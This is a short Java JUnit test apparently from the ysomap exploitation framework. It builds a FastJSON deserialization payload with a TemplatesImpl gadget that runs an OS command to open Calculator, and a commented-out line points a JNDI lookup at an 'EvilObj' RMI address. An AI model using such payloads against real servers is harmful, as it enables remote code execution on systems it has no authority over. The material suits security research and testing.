package ysomap.core.gadget.payload.json;

import org.junit.Test;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.gadget.bullet.json.TemplatesImplJsonBullet;
import ysomap.runner.PayloadRunner;

/**
 * @author wh1t3P1g
 * @since 2020/3/18
 */
public class FastJSON1Test {

    @Test
    public void getObject() throws Exception {
        Payload fastjson = new FastJSON1();
//        Bullet bullet = fastjson.getDefaultBullet("");
//        bullet.set("jndiURL","rmi://localhost:1099/EvilObj");

        Bullet bullet = new TemplatesImplJsonBullet();
        bullet.set("body","open /System/Applications/Calculator.app");
        new PayloadRunner()
                .setPayload(fastjson)
                .setBullet(bullet)
                .test();
    }
}